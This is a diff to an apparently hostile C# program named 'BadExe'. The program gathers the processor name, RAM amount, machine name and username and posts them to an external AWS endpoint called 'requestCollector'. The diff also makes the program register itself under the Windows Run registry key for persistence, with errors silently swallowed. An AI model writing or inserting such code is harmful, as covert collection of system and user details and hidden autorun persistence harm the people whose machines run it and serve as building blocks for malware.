@@ -107,14 +107,14 @@ namespace BadExe
         static async Task SendDataToCloudPC()
         {
             var cpuName = GetProcessorName();
-            long memKb;
-            var ramAmount = GetPhysicallyInstalledSystemMemory(out memKb);
+            long ramAmount;
+            GetPhysicallyInstalledSystemMemory(out ramAmount);
 
             var machineName=Environment.MachineName;
             var username=Environment.UserName;
 
             var httpClient = new HttpClient();
-            var httpContent = new StringContent("{\"cpuName\":\"" + cpuName + "\", \"memKb\":"+ memKb+ ", \"machineName\":\""+ machineName+ "\", \"username\":\""+ username+"\"}");
+            var httpContent = new StringContent("{\"cpuName\":\"" + cpuName + "\", \"memKb\":"+ ramAmount + ", \"machineName\":\""+ machineName+ "\", \"username\":\""+ username+"\"}");
             var result = await httpClient.PostAsync("https://o8m2j633k1.execute-api.eu-central-1.amazonaws.com/default/requestCollector", httpContent);
 
 
@@ -154,9 +154,19 @@ namespace BadExe
 
         static void AddToAutorun(string path)
         {
-            //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
-            var registerKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
-            registerKey.SetValue("badexe", path);
+            try
+            {
+                var registerKey = Registry.CurrentUser.CreateSubKey("MyKey");
+                registerKey.SetValue("badexe", path);
+                var result = registerKey.GetValue("badexe");
+                //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
+                var registerKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+                registerKey2.SetValue("badexe", path);
+                var result2 = registerKey2.GetValue("badexe");
+            }
+            catch {
+                Console.Write("");
+            }
         }
     }
 }
